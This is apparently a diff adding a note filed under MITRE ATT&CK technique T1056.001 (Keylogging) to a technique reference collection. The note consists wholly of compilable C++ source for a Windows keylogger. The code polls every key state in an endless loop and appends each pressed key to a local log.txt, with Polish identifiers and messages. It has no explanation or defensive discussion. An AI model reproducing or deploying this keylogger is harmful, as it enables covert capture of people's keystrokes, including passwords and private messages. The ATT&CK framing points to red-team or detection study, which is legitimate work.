@@ -1,0 +1,55 @@
+---
+title: "T1056.001.Keylogging.everybutton"
+folder: "11. Collection"
+---
+
+
+
+
+
+#include <windows.h>
+#include <fstream>
+#include <iostream>
+#include <sstream>
+
+
+void zapiszDoPliku(const std::string& tekst, const std::string& nazwaPliku) {
+    std::ofstream plik(nazwaPliku, std::ios_base::app);
+    if (plik.is_open()) {
+        plik << tekst;
+        plik.close();
+    }
+    else {
+        std::cerr << "Nie udalo sie otworzyc pliku do zapisu!" << std::endl;
+    }
+}
+
+int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
+
+    const int NUM_KEYS = 3;
+    int keys[NUM_KEYS] = { VK_SHIFT, VK_CONTROL, 'A' };
+
+    while (true) {
+        Sleep(10); 
+
+        for (int key = 0; key < 256; ++key) {
+            short keyState = GetKeyState(key);
+            if (keyState & 0x8000) {
+
+                char keyChar = static_cast<char>(key);
+
+
+                if ((keyChar >= 32 && keyChar <= 126) || keyChar == '\n' || keyChar == '\r') {
+                    std::string keyName(1, keyChar); 
+                    zapiszDoPliku(keyName, "log.txt");
+                }
+                else {
+                   
+                    std::string keyName = "[" + std::to_string(static_cast<int>(key)) + "]";
+                    zapiszDoPliku(keyName, "log.txt");
+                }
+            }
+        }
+    }
+    return 0;
+}
